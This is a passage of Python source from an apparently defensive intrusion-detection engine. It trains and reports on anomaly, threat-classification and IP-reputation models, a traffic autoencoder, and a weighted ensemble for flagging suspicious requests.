        
        print(f"[AI] Generated {len(X)} synthetic training samples")
        print(f"[AI] Attack types: {set(y_threat)}")
        
        # Train feature scaler
        print("[AI] Training feature scaler...")
        _feature_scaler = StandardScaler()
        X_scaled = _feature_scaler.fit_transform(X)
        
        # Train Anomaly Detector (IsolationForest)
        print("[AI] Training Anomaly Detector (IsolationForest, 100 trees)...")
        if _anomaly_detector is None:
            _anomaly_detector = IsolationForest(
                n_estimators=100,
                contamination=0.1,
                random_state=42,
                max_samples='auto',
                bootstrap=False
            )
        _anomaly_detector.fit(X_scaled)
        print(f"[AI] ✅ Anomaly Detector trained on synthetic data")
        
        # Train Threat Classifier (RandomForest)
        print("[AI] Training Threat Classifier (RandomForest, 200 trees)...")
        if _threat_classifier is None:
            _threat_classifier = RandomForestClassifier(
                n_estimators=200,
                max_depth=20,
                min_samples_split=5,
                min_samples_leaf=2,
                random_state=42,
                n_jobs=-1
            )
        _threat_classifier.fit(X_scaled, y_threat)
        print(f"[AI] ✅ Threat Classifier trained: {len(_threat_classifier.classes_)} classes")
        
        # Train IP Reputation (GradientBoosting)
        print("[AI] Training IP Reputation (GradientBoosting, 150 rounds)...")
        if _ip_reputation_model is None:
            _ip_reputation_model = GradientBoostingClassifier(
                n_estimators=150,
                learning_rate=0.1,
                max_depth=5,
                random_state=42
            )
        _ip_reputation_model.fit(X_scaled, y_anomaly)
        print(f"[AI] ✅ IP Reputation trained on synthetic data")
        
        _ml_last_trained = datetime.now(timezone.utc)
        
        # Save trained models
        _save_ml_models()
        
        print("[AI] 🎉 ML models trained and ready for deployment!")
        print("[AI] ✅ Models will improve accuracy as real threats are detected")
        
    except Exception as e:
        print(f"[AI ERROR] Synthetic training failed: {e}")
        import traceback
        traceback.print_exc()


def _train_ml_models_from_history() -> None:
    """Train ML models using historical threat data with time-weighted sampling.
    
    Recent threats are weighted 10x higher than old threats to:
    - Capture evolving attack patterns
    - Reduce impact of stale signatures
    - Adapt to changing threat landscape
    """
    global _ml_last_trained
    
    if not ML_AVAILABLE:
        return
    
    # Expire old threats (sliding window)
    expired_count = _expire_old_threats()
    
    # Combine local and peer threats for AI training (privacy-preserving)
    all_threats = _threat_log + _peer_threats  # AI learns from ALL attacks
    local_count = len(_threat_log)
    peer_count = len(_peer_threats)
    
    # Lowered threshold: Train with as few as 5 events (was 50)
    if len(all_threats) < 100:  # Minimum samples to prevent overfitting
        print(f"[AI] Not enough data to train. Need at least 100 threat events (prevents overfitting), have {len(all_threats)} (local: {local_count}, peer: {peer_count})")
        return
    
    try:
        print(f"[AI] Training ML models with {len(all_threats)} threat events (local: {local_count}, peer: {peer_count})")
        print(f"[AI] 🔒 Privacy: Dashboard shows only {local_count} local threats, but AI learns from all {len(all_threats)}")
        
        features_list = []
        labels_list = []
        anomaly_labels = []
        
        # Extract features from ALL threats (local + peer) with TIME WEIGHTING
        sample_weights = []  # Weights for each sample (recent = higher)
        
        for log in all_threats:
            # Calculate time-based weight
            timestamp = log.get('timestamp', datetime.now(timezone.utc).isoformat())
            weight = _calculate_threat_weight(timestamp)
            
            # Skip expired threats (weight = 0)
            if weight <= 0:
                continue
            
            # Reconstruct request features from log
            ip = log.get('ip_address', '127.0.0.1')
            endpoint = log.get('details', '')[:100]
            threat_type = log.get('threat_type', 'unknown')
            level = log.get('level', 'SAFE')
            
            # Create dummy features (in production, store original request features)
            features = _extract_features_from_request(
                ip_address=ip,
                endpoint=endpoint,
                user_agent='',
                headers={},
                method='GET'
            )
            
            if len(features) > 0:
                features_list.append(features)
                labels_list.append(threat_type)
                # Anomaly label: 1 if CRITICAL/DANGEROUS, 0 if SAFE/SUSPICIOUS
                anomaly_labels.append(1 if level in ['CRITICAL', 'DANGEROUS'] else 0)
                sample_weights.append(weight)
        
        if len(features_list) < 100:
            print(f"[AI] Not enough training data, need at least 100 samples (prevents noise-based training), have {len(features_list)}")
            return
        
        X = np.array(features_list)
        y_threat = np.array(labels_list)
        y_anomaly = np.array(anomaly_labels)
        weights = np.array(sample_weights)
        
        # Log time-weighting stats
        recent_weight = np.sum(weights[weights >= _RECENT_THREAT_MULTIPLIER])
        total_weight = np.sum(weights)
        recent_percentage = (recent_weight / total_weight * 100) if total_weight > 0 else 0
        print(f"[AI] Time weighting: Recent threats (<7 days) account for {recent_percentage:.1f}% of training influence")
        
        # Apply node-specific feature normalization (federated normalization)
        if NODE_FP_AVAILABLE:
            print("[AI] Applying federated normalization (node-specific scaling)...")
            X_normalized = np.array([node_fp.normalize_features(x) for x in X])
            print(f"[AI] Features normalized for node type: {node_fp.fingerprint['node_type']}")
        else:
            X_normalized = X
        
        # Train feature scaler (on normalized features)
        print("[AI] Training feature scaler...")
        _feature_scaler.fit(X_normalized)
        X_scaled = _feature_scaler.transform(X_normalized)
        
        # Train anomaly detector (IsolationForest doesn't support sample_weight, use contamination parameter)
        print("[AI] Training anomaly detector (IsolationForest)...")
        _anomaly_detector.fit(X_scaled)
        
        # Train threat classifier if we have enough diverse labels
        unique_labels = set(y_threat)
        unique_anomaly_classes = set(y_anomaly)
        
        if len(unique_labels) >= 2:
            print(f"[AI] Training threat classifier (RandomForest) with {len(unique_labels)} threat types (TIME-WEIGHTED)...")
            _threat_classifier.fit(X_scaled, y_threat, sample_weight=weights)
        else:
            print(f"[AI] ⚠️  Threat classifier needs 2+ threat types (currently: {len(unique_labels)}). Skipping...")
        
        # Train IP reputation model only if we have diverse classes
        if len(unique_anomaly_classes) >= 2 and len(y_anomaly) >= 10:
            print("[AI] Training IP reputation model (GradientBoosting, TIME-WEIGHTED)...")
            _ip_reputation_model.fit(X_scaled, y_anomaly, sample_weight=weights)
        else:
            print(f"[AI] ⚠️  IP reputation model needs diverse data (classes: {len(unique_anomaly_classes)}). Skipping...")
        
        _ml_last_trained = datetime.now(timezone.utc)
        
        # Save models
        _save_ml_models()
        
        avg_weight = np.mean(weights)
        max_weight = np.max(weights)
        print(f"[AI] ✅ ML training complete! Time-weighted (avg: {avg_weight:.2f}, max: {max_weight:.2f})")
        print(f"[AI] Training set size: {len(X)} samples (Recent threats prioritized {_RECENT_THREAT_MULTIPLIER}x higher)")
        print(f"[AI] Threat types: {list(unique_labels)}")
    
    except Exception as e:
        print(f"[AI ERROR] ML training failed: {e}")
        import traceback
        traceback.print_exc()


def _should_retrain_ml_models() -> bool:
    """Check if ML models should be retrained (INTELLIGENT AUTO-TRAINING).
    
    Retrain if:
    - Never trained before
    - Have minimum 100 samples (prevents overfitting on noise)
    - Time-based exponential backoff:
      * First training: immediate
      * 0-1000 samples: every 6 hours
      * 1000-5000 samples: every 12 hours
      * 5000+ samples: every 24 hours
    
    This ensures models converge to stable representations.
    """
    if not ML_AVAILABLE:
        return False
    
    # Require minimum samples to avoid training on noise
    if len(_threat_log) < 100:
        return False
    
    if _ml_last_trained is None:
        return True
    
    hours_since_training = (datetime.now(timezone.utc) - _ml_last_trained).total_seconds() / 3600
    
    # Exponential backoff based on data volume
    if len(_threat_log) < 1000:
        # Early learning: retrain every 6 hours with fresh data
        return hours_since_training > 6
    elif len(_threat_log) < 5000:
        # Mid-stage: retrain every 12 hours for stability
        return hours_since_training > 12
    else:
        # Mature model: retrain daily to avoid thrashing
        return hours_since_training > 24
    
    return False


def get_ml_model_stats() -> dict:
    """Get statistics about ML model performance and status."""
    if not ML_AVAILABLE:
        return {
            "ml_enabled": False,
            "reason": "ML libraries not installed"
        }
    
    stats = {
        "ml_enabled": True,
        "models_initialized": _anomaly_detector is not None,
        "last_trained": _ml_last_trained.isoformat() if _ml_last_trained else None,
        "training_data_size": len(_threat_log),
        "models": {},
        "performance_metrics": _ml_performance_metrics.copy(),
        "ensemble_weights": _ensemble_weights.copy(),
        "adaptive_thresholds": _adaptive_thresholds.copy()
    }
    
    if _anomaly_detector is not None:
        model_stats = {
            "type": "IsolationForest",
            "n_estimators": _anomaly_detector.n_estimators,
            "trained": hasattr(_anomaly_detector, 'estimators_')
        }
        # Add feature importance if available
        if hasattr(_anomaly_detector, 'estimators_') and _feature_importance_cache.get('anomaly'):
            model_stats["feature_importance_top5"] = _feature_importance_cache['anomaly'][:5]
        stats["models"]["anomaly_detector"] = model_stats
    
    if _threat_classifier is not None:
        model_stats = {
            "type": "RandomForestClassifier",
            "n_estimators": _threat_classifier.n_estimators,
            "trained": hasattr(_threat_classifier, 'classes_'),
            "classes": list(_threat_classifier.classes_) if hasattr(_threat_classifier, 'classes_') else []
        }
        # Add feature importance
        if hasattr(_threat_classifier, 'feature_importances_'):
            importances = _threat_classifier.feature_importances_
            top_indices = importances.argsort()[-5:][::-1]
            model_stats["feature_importance_top5"] = [(int(i), float(importances[i])) for i in top_indices]
            _feature_importance_cache['classifier'] = model_stats["feature_importance_top5"]
        stats["models"]["threat_classifier"] = model_stats
    
    if _ip_reputation_model is not None:
        model_stats = {
            "type": "GradientBoostingClassifier",
            "n_estimators": _ip_reputation_model.n_estimators,
            "trained": hasattr(_ip_reputation_model, 'classes_')
        }
        # Add feature importance
        if hasattr(_ip_reputation_model, 'feature_importances_'):
            importances = _ip_reputation_model.feature_importances_
            top_indices = importances.argsort()[-5:][::-1]
            model_stats["feature_importance_top5"] = [(int(i), float(importances[i])) for i in top_indices]
            _feature_importance_cache['reputation'] = model_stats["feature_importance_top5"]
        stats["models"]["ip_reputation"] = model_stats
    
    # PHASE 2: Autoencoder stats
    autoencoder = get_traffic_autoencoder()
    if autoencoder:
        stats["models"]["autoencoder"] = autoencoder.get_stats()
    
    # PHASE 3: Drift detector stats
    if ADVANCED_AI_AVAILABLE:
        try:
            drift_detector = get_drift_detector()
            if drift_detector:
                drift_stats = drift_detector.get_stats()
                stats["drift_detector"] = {
                    "baseline_size": drift_stats.get("baseline_size", 0),
                    "drift_percent": drift_stats.get("drift_percent", 0.0),
                    "status": drift_stats.get("status", "stable")
                }
                
                # Add recent drift reports
                recent_reports = drift_detector.get_recent_reports(limit=5)
                if recent_reports:
                    stats["drift_detector"]["recent_reports"] = recent_reports
        except Exception as e:
            logger.debug(f"[DRIFT] Failed to get drift stats: {e}")
    
    # PHASE 5: Meta decision engine stats
    if META_ENGINE_AVAILABLE:
        try:
            meta_engine = get_meta_engine()
            if meta_engine:
                meta_stats = meta_engine.get_stats()
                stats["meta_decision"] = {
                    "confidence": meta_stats.get("average_confidence", 0.0),
                    "models_count": meta_stats.get("active_signals", 0),
                    "agreement": meta_stats.get("agreement_rate", 0.0),
                    "total_decisions": meta_stats.get("total_decisions", 0)
                }
        except Exception as e:
            logger.debug(f"[META] Failed to get meta engine stats: {e}")
    
    # PHASE 6: Reputation tracker stats
    if REPUTATION_TRACKER_AVAILABLE:
        try:
            reputation_tracker = get_reputation_tracker()
            if reputation_tracker:
                rep_stats = reputation_tracker.get_stats()
                stats["reputation_tracker"] = {
                    "total_ips": rep_stats.get("total_ips", 0),
                    "high_risk_ips": rep_stats.get("high_risk_count", 0),
                    "trusted_ips": rep_stats.get("trusted_count", 0),
                    "avg_score": rep_stats.get("average_score", 0.0)
                }
        except Exception as e:
            logger.debug(f"[REPUTATION] Failed to get reputation stats: {e}")
    
    # PHASE 8: Orchestration stats
    if ORCHESTRATION_AVAILABLE:
        try:
            orchestrator = get_orchestrator()
            if orchestrator:
                orch_stats = orchestrator.get_stats()
                stats["orchestration_stats"] = {
                    "active_workflows": orch_stats.get("active_workflows", 0),
                    "auto_actions_taken": orch_stats.get("actions_taken", 0),
                    "workflow_success_rate": orch_stats.get("success_rate", 0.0)
                }
        except Exception as e:
            logger.debug(f"[ORCHESTRATION] Failed to get orchestration stats: {e}")
    
    # MODULE A: Kernel telemetry stats
    if KERNEL_TELEMETRY_AVAILABLE:
        try:
            kernel_telemetry = get_kernel_telemetry()
            if kernel_telemetry:
                tel_stats = kernel_telemetry.get_stats()
                stats["kernel_telemetry"] = {
                    "mode": tel_stats.get("mode", "Scapy"),
                    "packets_observed": tel_stats.get("packets_observed", 0),
                    "inspection_depth": tel_stats.get("inspection_depth", "userland")
                }
        except Exception as e:
            logger.debug(f"[TELEMETRY] Failed to get kernel telemetry stats: {e}")
    
    # Add to models dict for backward compatibility
    if ADVANCED_AI_AVAILABLE:
        try:
            drift_detector = get_drift_detector()
            if drift_detector:
                stats["models"]["drift_detector"] = drift_detector.get_stats()
                
                # Add recent drift reports
                recent_reports = drift_detector.get_recent_reports(limit=5)
                if recent_reports:
                    stats["models"]["drift_detector"]["recent_drift_reports"] = recent_reports
        except Exception as e:
            logger.debug(f"[DRIFT] Failed to get drift stats: {e}")
    
    # Attach high-level per-signal detection statistics for dashboards.
    try:
        stats["layer_detection_stats"] = get_layer_detection_stats()
    except Exception as e:
        logger.debug(f"[METRICS] Failed to compute layer detection stats: {e}")

    # Check if retraining is needed
    stats["needs_retraining"] = _should_retrain_ml_models()
    
    return stats


def get_layer_detection_stats() -> Dict[str, Any]:
    """Summarize per-signal detection statistics for AI layers.

    This aggregates lightweight, in-memory counters for signals that operate
    on individual requests, plus a small number of module-level metrics that
    act as AI layers (e.g., drift detector). It is read-only and does not
    affect any enforcement decisions.
    """

    # Base counts from request-level DetectionSignal accounting
    signal_counts = {k: int(v) for k, v in _signal_detection_counts.items()}

    stats: Dict[str, Any] = {
        "signal_counts": signal_counts,
        "step21_blocks": int(_step21_block_count),
    }

    # Drift detector: total drift reports raised so far
    if ADVANCED_AI_AVAILABLE:
        try:
            drift_detector = get_drift_detector()
            if drift_detector:
                drift_stats = drift_detector.get_stats()
                stats["drift_total_reports"] = int(drift_stats.get("total_drift_reports", 0))
        except Exception as e:
            logger.debug(f"[METRICS] Failed to fetch drift stats for layer metrics: {e}")

    # Byzantine defense: number of rejected malicious federated updates
    try:
        byz_stats = get_byzantine_defense_stats()
        if isinstance(byz_stats, dict):
            stats["byzantine_rejected_updates"] = int(byz_stats.get("rejected_updates", 0))
    except Exception as e:
        logger.debug(f"[METRICS] Failed to fetch Byzantine stats for layer metrics: {e}")

    return stats


def get_ai_abilities_status() -> Dict[str, Any]:
    """Summarize runtime status for the 18 advertised AI detection abilities.

    This is used by the dashboard to show which abilities are actually active
    in the current environment (libraries present, models initialized, etc.).
    """

    abilities: Dict[str, Dict[str, Any]] = {}

    # 1) Kernel Telemetry (eBPF)
    abilities["kernel_telemetry"] = {
        "label": "Kernel Telemetry (eBPF)",
        "enabled": KERNEL_TELEMETRY_AVAILABLE,
    }

    # 2) Signature Matching (core rules + signatures)
    abilities["signature_matching"] = {
        "label": "Signature Matching",
        # Signature-based detection is always available in this engine
        "enabled": True,
    }

    # 3) RandomForest ML (threat classifier)
    abilities["random_forest_ml"] = {
        "label": "RandomForest ML",
        "enabled": bool(ML_AVAILABLE and _threat_classifier is not None),
    }

    # 4) IsolationForest ML (anomaly detector)
    abilities["isolation_forest_ml"] = {
        "label": "IsolationForest ML",
        "enabled": bool(ML_AVAILABLE and _anomaly_detector is not None),
    }

    # 5) GradientBoosting ML (IP reputation)
    abilities["gradient_boosting_ml"] = {
        "label": "GradientBoosting ML",
        "enabled": bool(ML_AVAILABLE and _ip_reputation_model is not None),
    }

    # 6) Behavioral Heuristics
    abilities["behavioral_heuristics"] = {
        "label": "Behavioral Heuristics",
        "enabled": ADVANCED_AI_AVAILABLE,
    }

    # 7) LSTM Neural Network (sequence analyzer)
    abilities["lstm_sequence_model"] = {
        "label": "LSTM Neural Network",
        "enabled": ADVANCED_AI_AVAILABLE,
    }

    # 8) Traffic Autoencoder (deep learning)
    autoencoder = None
    if TENSORFLOW_AVAILABLE:
        try:
            autoencoder = get_traffic_autoencoder()
        except Exception:
            autoencoder = None
    abilities["traffic_autoencoder"] = {
        "label": "Traffic Autoencoder",
        "enabled": bool(TENSORFLOW_AVAILABLE and autoencoder is not None),
    }

    # 9) Drift Detector
    abilities["drift_detector"] = {
        "label": "Drift Detector",
        "enabled": ADVANCED_AI_AVAILABLE,
    }

    # 10) Graph Intelligence
    abilities["graph_intelligence"] = {
        "label": "Graph Intelligence",
        "enabled": GRAPH_INTELLIGENCE_AVAILABLE,
    }

    # 11) VPN/Tor Detection
    abilities["vpn_tor_detection"] = {
        "label": "VPN/Tor Detection",
        # VPN/Tor stats are computed entirely from threat logs and do not
        # require extra optional libraries beyond the core engine.
        "enabled": True,
    }

    # 12) Threat Intelligence (OSINT feeds)
    abilities["threat_intelligence"] = {
        "label": "Threat Intelligence",
        "enabled": ENTERPRISE_FEATURES_AVAILABLE,
    }

    # 13) False Positive Filter (5-gate)
    abilities["false_positive_filter"] = {
        "label": "False Positive Filter",
        "enabled": FP_FILTER_AVAILABLE,
    }

    # 14) Historical Reputation (long-term IP memory)
    abilities["historical_reputation"] = {
        "label": "Historical Reputation",
        "enabled": REPUTATION_TRACKER_AVAILABLE,
    }

    # 15) Explainability Engine
    abilities["explainability_engine"] = {
        "label": "Explainability Engine",
        "enabled": EXPLAINABILITY_AVAILABLE,
    }

    # 16) Predictive Modeling / Forecasting
    abilities["predictive_modeling"] = {
        "label": "Predictive Modeling",
        "enabled": bool(ML_AVAILABLE and ADVANCED_AI_AVAILABLE),
    }

    # 17) Byzantine Defense (federated learning hardening)
    byzantine_enabled = False
    try:
        stats = get_byzantine_defense_stats()
        byzantine_enabled = not bool(stats.get("error")) and stats.get("enabled", True)
    except Exception:
        byzantine_enabled = False
    abilities["byzantine_defense"] = {
        "label": "Byzantine Defense",
        "enabled": byzantine_enabled,
    }

    # 18) Integrity Monitoring / Self-Protection
    integrity_enabled = False
    try:
        from AI.self_protection import get_self_protection
        protector = get_self_protection()
        integrity_enabled = protector is not None
    except Exception:
        integrity_enabled = False
    abilities["integrity_monitoring"] = {
        "label": "Integrity Monitoring",
        "enabled": integrity_enabled,
    }

    total = len(abilities)
    enabled_count = sum(1 for a in abilities.values() if a.get("enabled"))

    return {
        "total": total,
        "enabled": enabled_count,
        "disabled": total - enabled_count,
        "abilities": abilities,
    }


# =============================================================================
# PHASE 2: AUTOENCODER ANOMALY DETECTION (Unsupervised Deep Learning)
# =============================================================================

class TrafficAutoencoder:
    """
    Autoencoder neural network for unsupervised anomaly detection.
    
    Learns normal traffic patterns without labels, detects anomalies based on
    reconstruction error. Complements supervised models (IsolationForest, RandomForest).
    
    Architecture:
    - Encoder: 15 → 32 → 16 → 8 (bottleneck)
    - Decoder: 8 → 16 → 32 → 15
    - Loss: Mean Squared Error (reconstruction error)
    
    Privacy: Model weights saved locally, can optionally share with relay.
    """
    
    def __init__(self, storage_dir: str = None):
        """Initialize autoencoder with persistent storage"""
        # Storage paths
        from AI.path_helper import get_json_dir, get_ml_models_dir

        default_json_dir = get_json_dir()
        self.storage_dir = storage_dir or default_json_dir
        self.model_dir = get_ml_models_dir()
        os.makedirs(self.model_dir, exist_ok=True)
        os.makedirs(self.storage_dir, exist_ok=True)
        
        self.model_path = os.path.join(self.model_dir, 'traffic_autoencoder.keras')
        self.scaler_path = os.path.join(self.model_dir, 'autoencoder_scaler.pkl')
        self.threshold_path = os.path.join(self.storage_dir, 'autoencoder_threshold.json')
        
        # Model configuration
        self.input_dim = 15  # Feature vector size
        self.encoding_dim = 8  # Bottleneck size
        
        # Components
        self.autoencoder = None
        self.encoder = None  # For feature extraction
        self.scaler = StandardScaler() if ML_AVAILABLE else None
        self.reconstruction_threshold = 0.05  # Default threshold
        
        # Training state
        self.is_trained = False
        self.last_trained = None
        self.training_samples = 0
        
        # Statistics
        self.total_predictions = 0
        self.total_anomalies_detected = 0
        
        # Load existing model if available
        self._load_model()
        self._load_threshold()
    
    def _build_model(self):
        """Build autoencoder architecture"""
        if not TENSORFLOW_AVAILABLE:
            logger.warning("[AUTOENCODER] TensorFlow not available")
            return None
        
        # Encoder
        input_layer = layers.Input(shape=(self.input_dim,))
        encoded = layers.Dense(32, activation='relu')(input_layer)
        encoded = layers.Dropout(0.2)(encoded)
        encoded = layers.Dense(16, activation='relu')(encoded)
        encoded = layers.Dropout(0.2)(encoded)
        encoded = layers.Dense(self.encoding_dim, activation='relu', name='bottleneck')(encoded)
        
        # Decoder
        decoded = layers.Dense(16, activation='relu')(encoded)
        decoded = layers.Dropout(0.2)(decoded)
        decoded = layers.Dense(32, activation='relu')(decoded)
        decoded = layers.Dropout(0.2)(decoded)
        decoded = layers.Dense(self.input_dim, activation='sigmoid')(decoded)
        
        # Full autoencoder
        autoencoder = Model(input_layer, decoded, name='traffic_autoencoder')
        autoencoder.compile(optimizer=Adam(learning_rate=0.001), loss='mse', metrics=['mae'])
        
        # Encoder model for feature extraction
        encoder = Model(input_layer, encoded, name='encoder')
        
        logger.info("[AUTOENCODER] Built model architecture")
        return autoencoder, encoder
    
    def _load_model(self):
        """Load trained model from disk"""
        if not TENSORFLOW_AVAILABLE:
            return False
        
        try:
            if os.path.exists(self.model_path):
                from tensorflow.keras.models import load_model
                self.autoencoder = load_model(self.model_path)
                
                # Rebuild encoder from loaded model
                self.encoder = Model(
                    inputs=self.autoencoder.input,
                    outputs=self.autoencoder.get_layer('bottleneck').output,
                    name='encoder'
                )
                
                self.is_trained = True
                logger.info(f"[AUTOENCODER] Loaded trained model from {self.model_path}")
                
                # Load scaler
                if os.path.exists(self.scaler_path) and ML_AVAILABLE:
                    self.scaler = joblib.load(self.scaler_path)
                    logger.info("[AUTOENCODER] Loaded feature scaler")
                
                return True
        except Exception as e:
            logger.error(f"[AUTOENCODER] Failed to load model: {e}")
        
        return False
    
    def _load_threshold(self):
        """Load anomaly threshold from disk"""
        try:
            if os.path.exists(self.threshold_path):
                with open(self.threshold_path, 'r') as f:
                    data = json.load(f)
                    self.reconstruction_threshold = data.get('threshold', 0.05)
                    self.last_trained = data.get('last_trained')
                    self.training_samples = data.get('training_samples', 0)
                    logger.info(f"[AUTOENCODER] Loaded threshold: {self.reconstruction_threshold:.4f}")
        except Exception as e:
            logger.error(f"[AUTOENCODER] Failed to load threshold: {e}")
    
    def _save_threshold(self):
        """Save anomaly threshold to disk"""
        try:
            data = {
                'threshold': float(self.reconstruction_threshold),
                'last_trained': self.last_trained,
                'training_samples': self.training_samples,
                'updated': datetime.now().isoformat()
            }
            with open(self.threshold_path, 'w') as f:
                json.dump(data, f, indent=2)
            logger.info("[AUTOENCODER] Saved threshold configuration")
            return True
        except Exception as e:
            logger.error(f"[AUTOENCODER] Failed to save threshold: {e}")
            return False
    
    def train(self, normal_traffic_features: np.ndarray, epochs: int = 50, batch_size: int = 32) -> dict:
        """
        Train autoencoder on NORMAL traffic only (unsupervised).
        
        Args:
            normal_traffic_features: Array of features from normal/safe traffic
            epochs: Training epochs
            batch_size: Batch size
        
        Returns:
            Training statistics
        """
        if not TENSORFLOW_AVAILABLE:
            return {'status': 'error', 'message': 'TensorFlow not available'}
        
        if not ML_AVAILABLE:
            return {'status': 'error', 'message': 'scikit-learn not available'}
        
        if len(normal_traffic_features) < 100:
            return {
                'status': 'insufficient_data',
                'required': 100,
                'available': len(normal_traffic_features)
            }
        
        try:
            # Normalize features
            X_scaled = self.scaler.fit_transform(normal_traffic_features)
            
            # Build or rebuild model
            if self.autoencoder is None:
                self.autoencoder, self.encoder = self._build_model()
            
            # Train
            logger.info(f"[AUTOENCODER] Training on {len(X_scaled)} normal traffic samples...")
            history = self.autoencoder.fit(
                X_scaled, X_scaled,  # Input = Output (reconstruction)
                epochs=epochs,
                batch_size=batch_size,
                validation_split=0.2,
                verbose=0,
                shuffle=True
            )
            
            # Calculate reconstruction threshold (95th percentile of training errors)
            reconstructions = self.autoencoder.predict(X_scaled, verbose=0)
            mse = np.mean(np.power(X_scaled - reconstructions, 2), axis=1)
            self.reconstruction_threshold = float(np.percentile(mse, 95))
            
            # Update state
            self.is_trained = True
            self.last_trained = datetime.now().isoformat()
            self.training_samples = len(normal_traffic_features)
            
            # Save model
            self.autoencoder.save(self.model_path)
            if ML_AVAILABLE:
                joblib.dump(self.scaler, self.scaler_path)
            self._save_threshold()
            
            logger.info(f"[AUTOENCODER] Training complete. Threshold: {self.reconstruction_threshold:.4f}")
            
            return {
                'status': 'success',
                'samples': len(normal_traffic_features),
                'epochs': epochs,
                'final_loss': float(history.history['loss'][-1]),
                'val_loss': float(history.history['val_loss'][-1]),
                'threshold': float(self.reconstruction_threshold),
                'trained_at': self.last_trained
            }
        
        except Exception as e:
            logger.error(f"[AUTOENCODER] Training failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    def detect_anomaly(self, features: np.ndarray) -> Tuple[bool, float, float]:
        """
        Detect if traffic is anomalous based on reconstruction error.
        
        Args:
            features: Feature vector (15 dimensions)
        
        Returns:
            (is_anomaly, reconstruction_error, anomaly_score)
            - is_anomaly: True if reconstruction error > threshold
            - reconstruction_error: MSE between input and reconstruction
            - anomaly_score: Normalized score 0-1 (higher = more anomalous)
        """
        if not self.is_trained or self.autoencoder is None:
            return False, 0.0, 0.0
        
        try:
            # Reshape and scale
            features_2d = features.reshape(1, -1)
            if ML_AVAILABLE and hasattr(self.scaler, 'mean_'):
                features_scaled = self.scaler.transform(features_2d)
            else:
                features_scaled = features_2d
            
            # Reconstruct
            reconstruction = self.autoencoder.predict(features_scaled, verbose=0)
            
            # Calculate reconstruction error
            mse = np.mean(np.power(features_scaled - reconstruction, 2))
            
            # Determine if anomaly
            is_anomaly = mse > self.reconstruction_threshold
            
            # Normalize score (0-1, capped at 5x threshold)
            anomaly_score = min(mse / (self.reconstruction_threshold * 5), 1.0)
            
            # Update stats
            self.total_predictions += 1
            if is_anomaly:
                self.total_anomalies_detected += 1
            
            return bool(is_anomaly), float(mse), float(anomaly_score)
        
        except Exception as e:
            logger.error(f"[AUTOENCODER] Detection failed: {e}")
            return False, 0.0, 0.0
    
    def get_encoded_features(self, features: np.ndarray) -> Optional[np.ndarray]:
        """Extract compressed features from bottleneck layer"""
        if not self.is_trained or self.encoder is None:
            return None
        
        try:
            features_2d = features.reshape(1, -1)
            if ML_AVAILABLE and hasattr(self.scaler, 'mean_'):
                features_scaled = self.scaler.transform(features_2d)
            else:
                features_scaled = features_2d
            
            encoded = self.encoder.predict(features_scaled, verbose=0)
            return encoded[0]
        except Exception as e:
            logger.error(f"[AUTOENCODER] Feature extraction failed: {e}")
            return None
    
    def get_stats(self) -> dict:
        """Get autoencoder statistics"""
        return {
            'tensorflow_available': TENSORFLOW_AVAILABLE,
            'is_trained': self.is_trained,
            'last_trained': self.last_trained,
            'training_samples': self.training_samples,
            'reconstruction_threshold': float(self.reconstruction_threshold),
            'total_predictions': self.total_predictions,
            'anomalies_detected': self.total_anomalies_detected,
            'anomaly_rate': (self.total_anomalies_detected / self.total_predictions 
                           if self.total_predictions > 0 else 0.0),
            'model_path': self.model_path
        }


# Global autoencoder instance
_traffic_autoencoder = None


def get_traffic_autoencoder() -> Optional[TrafficAutoencoder]:
    """Get or create global traffic autoencoder instance"""
    global _traffic_autoencoder
    if _traffic_autoencoder is None and TENSORFLOW_AVAILABLE:
        _traffic_autoencoder = TrafficAutoencoder()
    return _traffic_autoencoder


# Continuation of get_ml_model_stats (orphaned code needs reorganization)
def _finalize_ml_stats():
    """Helper function - orphaned code, will be removed"""
    pass


def retrain_ml_models_now() -> dict:
    """Force immediate retraining of ML models.
    
    Returns summary of training results.
    """
    if not ML_AVAILABLE:
        return {"success": False, "error": "ML not available"}
    
    try:
        _train_ml_models_from_history()
        return {
            "success": True,
            "trained_at": _ml_last_trained.isoformat(),
            "training_samples": len(_threat_log),
            "models_trained": ["anomaly_detector", "threat_classifier", "ip_reputation"],
            "performance_metrics": _ml_performance_metrics.copy(),
            "adaptive_thresholds": _adaptive_thresholds.copy()
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _ensemble_predict(features: np.ndarray) -> Tuple[bool, float, dict]:
    """Ensemble voting: Combine predictions from all ML models.
    
    Uses weighted voting to combine:
    - Anomaly detection (IsolationForest)
    - Threat classification (RandomForest)
    - IP reputation (GradientBoosting)
    
    Returns:
        (is_threat, confidence, details)
    """
    if not ML_AVAILABLE:
        return False, 0.0, {}
    
    try:
        predictions = {}
        scores = {}
        
        # 1. Anomaly Detection
        is_anomaly, anomaly_score = _ml_predict_anomaly(features)
        predictions['anomaly'] = is_anomaly
        # Normalize anomaly score to 0-1 range (IsolationForest gives negative scores)
        normalized_anomaly = max(0.0, min(1.0, (-anomaly_score + 0.5) / 1.5))
        scores['anomaly'] = normalized_anomaly if is_anomaly else (1.0 - normalized_anomaly)
        
        # 2. Threat Classification
        if hasattr(_threat_classifier, 'classes_'):
            threat_type, threat_conf = _ml_classify_threat(features)
            predictions['threat'] = (threat_conf > _adaptive_thresholds['threat_confidence'] and threat_type != 'safe')
            scores['threat'] = threat_conf
        else:
            predictions['threat'] = False
            scores['threat'] = 0.0
        
        # 3. IP Reputation
        if hasattr(_ip_reputation_model, 'classes_'):
            is_malicious, reputation_score = _ml_predict_ip_reputation(features)
            predictions['reputation'] = is_malicious
            scores['reputation'] = reputation_score
        else:
            predictions['reputation'] = False
            scores['reputation'] = 0.0
        
        # Weighted ensemble voting
        ensemble_score = (
            scores['anomaly'] * _ensemble_weights['anomaly_detector'] +
            scores['threat'] * _ensemble_weights['threat_classifier'] +
            scores['reputation'] * _ensemble_weights['ip_reputation']
        )
        
        is_threat = ensemble_score > _adaptive_thresholds['ensemble_threshold']
        
        details = {
            'predictions': predictions,
            'scores': scores,
            'ensemble_score': float(ensemble_score),
            'threshold': _adaptive_thresholds['ensemble_threshold']
        }
        
        return is_threat, float(ensemble_score), details
    
    except Exception as e:
        print(f"[AI WARNING] Ensemble prediction failed: {e}")
        return False, 0.0, {}


def _update_performance_metrics(predicted_threat: bool, actual_threat: bool) -> None:
    """Update ML performance metrics based on predictions vs reality.
    
    Args:
        predicted_threat: What the model predicted
        actual_threat: What actually happened (ground truth)
    """
    global _ml_performance_metrics
    
    _ml_performance_metrics['predictions_made'] += 1
    
